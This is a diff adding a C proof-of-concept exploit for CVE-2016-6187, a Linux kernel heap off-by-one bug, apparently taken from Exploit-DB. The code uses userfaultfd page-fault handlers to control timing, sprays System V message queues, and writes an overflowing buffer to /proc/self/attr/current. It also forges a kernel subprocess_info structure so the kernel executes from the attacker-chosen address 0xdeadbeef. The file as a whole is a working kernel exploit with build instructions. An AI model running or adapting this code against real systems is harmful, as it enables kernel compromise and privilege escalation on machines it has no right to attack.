@@ -1,0 +1,263 @@
+/**
+ EDB Note ~ Download: http://cyseclabs.com/exploits/matreshka.c
+ Blog ~ http://cyseclabs.com/blog/cve-2016-6187-heap-off-by-one-exploit
+**/
+
+/**
+ * Quick and dirty PoC for CVE-2016-6187 heap off-by-one PoC
+ * By Vitaly Nikolenko
+ * vnik@cyseclabs.com
+ *
+ * There's no privilege escalation payload but the kernel will execute
+ * instructions from 0xdeadbeef.
+ *
+ * gcc matreshka.c -o matreshka -lpthread
+ *
+ * greetz to dmr and s1m0n
+ */
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/ipc.h>
+#include <sys/msg.h>
+#include <string.h>
+#include <sys/mman.h>
+#include <fcntl.h>
+#include <sys/socket.h>
+#include <linux/userfaultfd.h>
+#include <stdlib.h>
+#include <errno.h>
+#include <sys/mman.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/ioctl.h>
+#include <unistd.h>
+#include <strings.h>
+#include <unistd.h>
+#include <asm/unistd.h>
+#include <poll.h>
+#include <pthread.h>
+#include <stdint.h>
+
+void setup_pagefault(void *, unsigned, uint8_t);
+
+const int pagesize = 4096;
+
+struct {
+	long mtype;
+	char mtext[48];
+} msg;
+
+struct thread_struct {
+	int fd;
+	uint8_t h_sw; // handler switch
+	uint8_t count;
+};
+
+struct subprocess_info {
+	long a; long b; long c; long d; // 32 bytes for work_struct
+	long *complete;
+	char *path;
+	char **argv;
+	char **envp;
+	int wait;
+	int retval;
+	int (*init)(void);
+	int (*cleanup)(void);
+	void *data;
+};
+
+void *pf_handler(void *data) {
+	struct thread_struct *params = data;
+	int count = params->count;
+
+	int fd = params->fd;
+
+	for (;;) {
+		struct uffd_msg msg;
+		
+		struct pollfd pollfd[1];
+		pollfd[0].fd = params->fd;
+		pollfd[0].events = POLLIN;
+		int pollres;
+		
+		pollres = poll(pollfd, 1, -1);
+		switch (pollres) {
+		case -1:
+			perror("poll userfaultfd");
+			continue;
+			break;
+		case 0: continue; break;
+		case 1: break;
+		default:
+			exit(2);
+		}
+		if (pollfd[0].revents & POLLERR) {
+			exit(1);
+		}
+		if (!(pollfd[0].revents & POLLIN)) {
+			continue;
+		}
+		
+		int readret;
+		readret = read(fd, &msg, sizeof(msg));
+
+		if (readret == -1) {
+			if (errno == EAGAIN)
+				continue;
+			perror("read userfaultfd");
+		}
+
+		if (readret != sizeof(msg)) {
+			fprintf(stderr, "short read, not expected, exiting\n");
+			exit(1);
+		}
+		
+		long long addr = msg.arg.pagefault.address;
+    		char buf[pagesize];
+		long *ptr = (long *)buf;
+	
+		// just for lolz
+		memset(buf, 'B', pagesize);
+	
+		struct uffdio_copy cp;
+		cp.src = (long long)buf;
+		cp.dst = (long long)(addr & ~(0x1000 - 1));
+		cp.len = (long long)pagesize;
+		cp.mode = 0;
+
+		void *tmp_addr;
+
+		if (count != 3) {
+			if (count % 2)
+				tmp_addr = (void *)(0x40000000 & ~(0x1000 - 1));
+			else
+				tmp_addr = (void *)((0x40000000 & ~(0x1000 - 1)) + 0x1000);
+
+			// remap and set up the page fault hander
+			munmap(tmp_addr, 0x1000);
+	   		void *region = mmap(tmp_addr, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
+			setup_pagefault(tmp_addr, 0x1000, ++count);
+		} else {
+			// change the first page which is already mmaped
+			struct subprocess_info *p = (struct subprocess_info *)(0x40000000 + 0x1000 - 88);
+			p->path = 0;
+			p->cleanup = (void *)0xdeadbeef;
+		}
+		
+ 		if (ioctl(fd, UFFDIO_COPY, &cp) == -1) {
+			perror("ioctl(UFFDIO_COPY)");
+		}
+	}
+	return NULL;
+}
+
+
+void setup_pagefault(void *addr, unsigned size, uint8_t count) {
+	void *region;
+	int uffd;
+	pthread_t uffd_thread;
+	struct uffdio_api uffdio_api;
+
+	uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
+
+	if (uffd == -1) {
+		perror("syscall");
+		return;
+	}
+
+	uffdio_api.api = UFFD_API;
+	uffdio_api.features = 0;
+
+        // just to be nice
+	if (ioctl(uffd, UFFDIO_API, &uffdio_api)) {
+		fprintf(stderr, "UFFDIO_API\n");
+		exit(1);
+	}
+
+	if (uffdio_api.api != UFFD_API) {
+		fprintf(stderr, "UFFDIO_API error %Lu\n", uffdio_api.api);
+		exit(1);
+	}
+
+	struct uffdio_register uffdio_register;
+	uffdio_register.range.start = (unsigned long)addr;
+	uffdio_register.range.len = size;
+	uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
+
+	if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1) {
+		perror("ioctl(UFFDIO_REGISTER)");
+		exit(1);
+	}
+	printf("userfaultfd ioctls: 0x%llx\n", uffdio_register.ioctls);
+
+	int expected = UFFD_API_RANGE_IOCTLS;
+	if ((uffdio_register.ioctls & expected) != expected) {
+		fprintf(stderr, "ioctl set is incorrect\n");
+		exit(1);
+	}
+
+	struct thread_struct thr_params;
+        struct thread_struct *params = (struct thread_struct *)malloc(sizeof(struct thread_struct));
+	params->fd = uffd;
+        params->count = count;
+	pthread_create(&uffd_thread, NULL, pf_handler, (void *)params);
+}
+
+int main(int argc, char **argv) {
+	void *region, *map;
+	pthread_t uffd_thread;
+	int uffd, msqid, i;
+
+	region = (void *)mmap((void *)0x40000000, 0x2000, PROT_READ|PROT_WRITE,
+                               MAP_FIXED|MAP_PRIVATE|MAP_ANON, -1, 0);
+
+	if (!region) {
+		perror("mmap");
+		exit(2);
+	}
+
+	setup_pagefault(region + 0x1000, 0x1000, 1);
+
+	printf("my pid = %d\n", getpid());
+
+	if (!map) {
+		perror("mmap");
+	}
+
+	//memset(msg.mtext, 'A', sizeof(msg.mtext)-1);
+	unsigned long *p = (unsigned long *)msg.mtext;
+	for (i = 0; i < 6; i++) {
+		*p ++ = 0x0000000040000000 + 0x1000 - 88;
+	}
+	msg.mtype = 1;
+
+	msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
+
+	for (i = 0; i < 320; i++) { // that's generally the limit
+		if (msgsnd(msqid, &msg, 48, 0) == -1) {
+			perror("msgsnd");
+			return -1;
+		}
+	}
+
+	char buf[96];
+	p = (unsigned long *)buf;
+
+	for (i = 0; i < 11; i++) {
+		*p ++ = 0x40000000 + 0x1000 - 88;
+	}
+	*p ++ = 0xfffffffffffffff;
+
+	int fd = open("/proc/self/attr/current", O_RDWR);
+	write(fd, buf, 96);
+
+        // go figure why we do it 3 times
+	msgsnd(msqid, &msg, 48, 0);
+	msgsnd(msqid, &msg, 48, 0);
+	msgsnd(msqid, &msg, 48, 0);
+
+	socket(22, AF_INET, 0);
+
+	close(fd);
+	return 0;
+}
